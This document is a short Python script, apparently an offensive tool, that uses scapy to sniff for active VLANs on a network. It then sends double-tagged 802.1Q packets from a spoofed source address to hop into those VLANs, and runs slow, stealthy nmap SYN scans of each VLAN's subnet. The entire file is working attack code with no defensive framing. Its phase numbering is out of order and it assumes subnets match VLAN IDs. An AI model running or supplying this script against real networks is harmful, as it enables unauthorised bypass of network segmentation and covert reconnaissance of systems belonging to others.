from scapy.all import Ether, Dot1Q, IP, ICMP, sendp, RandMAC
import time
import subprocess

iface = "eth0"  # set interface (adjust as needed)
native_vlan = 1  # this is the vlan we're already on
src_ip = "192.168.1.99"  # spoofed source ip (ours)
payload_target = "192.168.10.1"  # placeholder ip to ping; adjust or guess as needed

seen_vlans = set()

print("[*] Phase 3: Discovering VLANs on the wire...\n")

# start passive sniffing to see what VLANs are active
def discover_vlans(pkt):
    if Dot1Q in pkt:
        vlan_id = pkt[Dot1Q].vlan
        if vlan_id not in seen_vlans:
            seen_vlans.add(vlan_id)
            ether_layer = pkt[Ether]
            print(f"[+] Detected VLAN ID: {vlan_id} from {ether_layer.src} -> {ether_layer.dst}")

# sniffs for vlan tagged packets quietly for 30 seconds
from scapy.all import sniff
sniff(
    iface=iface,
    filter="vlan",
    prn=discover_vlans,
    store=False,
    timeout=30
)

print("\n[*] Phase 1: Sending double-tagged packets to provoke vlan interaction...\n")

# send crafted packets to each vlan we saw
for target_vlan in seen_vlans:
    print(f"[>] Probing VLAN {target_vlan} using double-tag...")

    pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC()) / \
          Dot1Q(vlan=native_vlan) / \
          Dot1Q(vlan=target_vlan) / \
          IP(src=src_ip, dst=payload_target) / \
          ICMP()

    sendp(pkt, iface=iface, count=5, inter=1)
    time.sleep(1)

print("\n[*] Phase 2: Nmap each vlan we saw for live targets...\n")

# for every vlan we saw, run nmap slowly and quietly
for vlan_id in seen_vlans:
    print(f"[>] Scanning VLAN {vlan_id} with slow stealthy SYN scan...")
    filename = f"nmap_results/vlan_{vlan_id}_scan.txt"
    subprocess.run([
        "nmap", "-sS", "-Pn", "-T2", "--open",
        f"192.168.{vlan_id}.0/24", "-oN", filename
    ])

print("\n[+] Finished: all packets sent and scans completed. Check the nmap_results folder.")
